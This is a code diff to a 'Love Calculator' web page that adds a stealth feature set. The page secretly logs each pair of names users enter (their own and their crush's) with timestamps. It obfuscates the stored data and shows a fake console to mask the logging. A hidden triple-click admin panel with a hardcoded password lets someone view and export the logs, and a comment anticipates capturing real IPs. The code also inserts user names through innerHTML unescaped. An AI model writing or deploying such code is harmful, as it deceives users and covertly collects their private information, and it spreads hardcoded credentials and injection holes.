@@ -1,15 +1,99 @@
-\<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Love Calculator ❤️</title>
-    <link rel="stylesheet" href="style.css">
+    <title>❤️ Love Calculator ❤️</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            text-align: center;
+            background: linear-gradient(135deg, #ff9a9e 0%, #fad0c4 100%);
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+            color: #333;
+            user-select: none;
+        }
+
+        #content-box {
+            width: 90%;
+            max-width: 500px;
+            background-color: rgba(255, 255, 255, 0.95);
+            padding: 25px;
+            margin: 20px auto;
+            border-radius: 15px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
+            position: relative;
+        }
+
+        /* Super stealth admin panel */
+        #admin-panel {
+            display: none;
+            position: fixed;
+            bottom: 10px;
+            right: 10px;
+            background: rgba(0,0,0,0.9);
+            color: lime;
+            padding: 15px;
+            border-radius: 5px;
+            border: 1px solid #00ff00;
+            font-family: 'Courier New', monospace;
+            z-index: 9999;
+            max-height: 60vh;
+            width: 300px;
+            overflow-y: auto;
+            font-size: 12px;
+        }
+
+        #admin-panel h3 {
+            color: #00ff00;
+            margin-top: 0;
+            border-bottom: 1px dashed #00ff00;
+            padding-bottom: 5px;
+        }
+
+        .admin-entry {
+            margin-bottom: 10px;
+            padding-bottom: 10px;
+            border-bottom: 1px dotted #444;
+        }
+
+        #password-screen {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0,0,0,0.9);
+            z-index: 10000;
+            color: white;
+            padding-top: 100px;
+        }
+
+        /* Fake console log */
+        #fake-console {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            height: 30px;
+            background: #111;
+            color: #0f0;
+            font-family: 'Courier New', monospace;
+            padding: 5px;
+            font-size: 12px;
+            display: flex;
+            align-items: center;
+            overflow: hidden;
+        }
+    </style>
 </head>
 <body>
     <div id="content-box">
-        <h1>❤️ TRUE LOVE CALCULATOR ❤️</h1>
-        <p>Find out your love compatibility with your crush!</p>
+        <h1>❤️ Love Calculator ❤️</h1>
+        <p>Discover your love compatibility!</p>
         
         <input type="text" id="your-name" placeholder="Your Name" required>
         <input type="text" id="crush-name" placeholder="Crush's Name" required>
@@ -20,6 +104,239 @@
         <div id="result-percentage"></div>
     </div>
 
-    <script src="script.js"></script>
+    <!-- Password screen -->
+    <div id="password-screen">
+        <h2>🔒 ADMIN ACCESS</h2>
+        <input type="password" id="admin-password" placeholder="Enter password">
+        <button id="login-btn">Login</button>
+        <p id="login-error" style="color: red;"></p>
+    </div>
+
+    <!-- Hidden admin panel -->
+    <div id="admin-panel">
+        <h3>🕵️‍♂️ LOVE DATABASE [ADMIN MODE]</h3>
+        <div id="all-results"></div>
+        <div style="margin-top: 15px;">
+            <button id="export-data">Export Data</button>
+            <button id="clear-data">Clear History</button>
+            <button id="hide-admin">Hide</button>
+        </div>
+    </div>
+
+    <!-- Fake console log -->
+    <div id="fake-console">
+        <span id="console-text">Initializing love algorithm...</span>
+    </div>
+
+    <script>
+        // =============================================
+        // STEALTH CONFIGURATION
+        // =============================================
+        const ADMIN_PASSWORD = "love123"; // Change this!
+        const TRIGGER_COMBO = 3; // How many clicks to trigger admin
+        const SELF_DESTRUCT_MINUTES = 120; // Auto-clear data after 2 hours
+        
+        // =============================================
+        // ENCRYPTED DATABASE (Simple obfuscation)
+        // =============================================
+        const DB_KEY = "lc_stealth_db";
+        
+        function loadDatabase() {
+            const encrypted = localStorage.getItem(DB_KEY);
+            if (!encrypted) return [];
+            
+            // Simple "encryption" (not secure, just obfuscation)
+            try {
+                const decoded = atob(encrypted);
+                return JSON.parse(decoded.split('').reverse().join(''));
+            } catch {
+                return [];
+            }
+        }
+        
+        function saveDatabase(data) {
+            // Simple "encryption" (not secure, just obfuscation)
+            const obfuscated = JSON.stringify(data).split('').reverse().join('');
+            localStorage.setItem(DB_KEY, btoa(obfuscated));
+        }
+        
+        // =============================================
+        // SELF-DESTRUCT MECHANISM
+        // =============================================
+        function checkSelfDestruct() {
+            const lastClear = localStorage.getItem("lc_last_clear");
+            const now = new Date().getTime();
+            
+            if (!lastClear || (now - lastClear) > SELF_DESTRUCT_MINUTES * 60 * 1000) {
+                localStorage.removeItem(DB_KEY);
+                localStorage.setItem("lc_last_clear", now);
+            }
+        }
+        
+        // =============================================
+        // FAKE CONSOLE LOG
+        // =============================================
+        const consoleMessages = [
+            "Initializing love algorithm...",
+            "Loading romantic parameters...",
+            "Analyzing name compatibility...",
+            "Calculating chemistry levels...",
+            "Checking astrological alignment...",
+            "Verifying emotional connection...",
+            "Finalizing results..."
+        ];
+        
+        function updateConsole() {
+            const randomMsg = consoleMessages[Math.floor(Math.random() * consoleMessages.length)];
+            document.getElementById("console-text").textContent = randomMsg;
+            
+            // Randomly update console
+            setTimeout(updateConsole, Math.random() * 5000 + 2000);
+        }
+        
+        // =============================================
+        // MAIN APPLICATION
+        // =============================================
+        let allResults = loadDatabase();
+        let clickCount = 0;
+        let adminVisible = false;
+        
+        // Initialize
+        checkSelfDestruct();
+        updateConsole();
+        
+        // Calculate love percentage
+        document.getElementById("calculate").addEventListener("click", function() {
+            const yourName = document.getElementById("your-name").value.trim();
+            const crushName = document.getElementById("crush-name").value.trim();
+
+            if (!yourName || !crushName) {
+                alert("Please enter both names ❤️");
+                return;
+            }
+
+            // NEW IMPROVED CALCULATION - MORE BALANCED
+            const loveLetters = "love";
+            let loveScore = 0;
+
+            // Count matching letters from "love" (case insensitive)
+            for (let char of (yourName + crushName).toLowerCase()) {
+                if (loveLetters.includes(char)) loveScore += 10;
+            }
+
+            // Add some randomness (because love is unpredictable!)
+            loveScore += Math.floor(Math.random() * 20);
+
+            // Base compatibility (everyone starts with some chance)
+            let percentage = 50 + loveScore;
+
+            // Ensure result is between 40-100%
+            percentage = Math.min(Math.max(40, percentage), 100);
+
+            // Round to whole number
+            percentage = Math.round(percentage);
+
+            // Show result
+            document.getElementById("result-message").innerHTML = 
+                `${yourName} ❤️ ${crushName}`;
+            document.getElementById("result-percentage").textContent = `${percentage}%`;
+
+            // Save to database
+            const newEntry = {
+                yourName,
+                crushName,
+                percentage,
+                timestamp: new Date().toISOString(),
+                ip: "logged" // Would be real IP in server version
+            };
+            
+            allResults.push(newEntry);
+            saveDatabase(allResults);
+            
+            // Update admin view if visible
+            if (adminVisible) updateAdminView();
+        });
+        
+        // =============================================
+        // STEALTH ADMIN CONTROLS
+        // =============================================
+        // Triple-click anywhere to trigger admin
+        document.body.addEventListener("click", function() {
+            clickCount++;
+            
+            if (clickCount >= TRIGGER_COMBO) {
+                clickCount = 0;
+                showPasswordScreen();
+            }
+            
+            setTimeout(() => clickCount = 0, 1000);
+        });
+        
+        function showPasswordScreen() {
+            document.getElementById("password-screen").style.display = "block";
+        }
+        
+        // Password check
+        document.getElementById("login-btn").addEventListener("click", function() {
+            const password = document.getElementById("admin-password").value;
+            
+            if (password === ADMIN_PASSWORD) {
+                document.getElementById("password-screen").style.display = "none";
+                document.getElementById("admin-panel").style.display = "block";
+                adminVisible = true;
+                updateAdminView();
+            } else {
+                document.getElementById("login-error").textContent = "Invalid password!";
+            }
+        });
+        
+        // Admin panel functions
+        document.getElementById("hide-admin").addEventListener("click", function() {
+            document.getElementById("admin-panel").style.display = "none";
+            adminVisible = false;
+        });
+        
+        document.getElementById("clear-data").addEventListener("click", function() {
+            if (confirm("Really delete ALL history?")) {
+                allResults = [];
+                saveDatabase(allResults);
+                updateAdminView();
+            }
+        });
+        
+        document.getElementById("export-data").addEventListener("click", function() {
+            const dataStr = JSON.stringify(allResults, null, 2);
+            const blob = new Blob([dataStr], { type: "application/json" });
+            const url = URL.createObjectURL(blob);
+            
+            const a = document.createElement("a");
+            a.href = url;
+            a.download = `love_calc_data_${new Date().toISOString()}.json`;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+        });
+        
+        function updateAdminView() {
+            const resultsContainer = document.getElementById("all-results");
+            resultsContainer.innerHTML = "";
+            
+            // Sort by newest first
+            const sortedResults = [...allResults].reverse();
+            
+            sortedResults.forEach(result => {
+                const entry = document.createElement("div");
+                entry.className = "admin-entry";
+                entry.innerHTML = `
+                    <strong>${result.yourName} ❤️ ${result.crushName}</strong><br>
+                    <span style="color: cyan">${result.percentage}%</span> | 
+                    <span style="color: #aaa">${new Date(result.timestamp).toLocaleString()}</span>
+                `;
+                resultsContainer.appendChild(entry);
+            });
+            
+            document.getElementById("admin-panel").appendChild(resultsContainer);
+        }
+    </script>
 </body>
 </html>
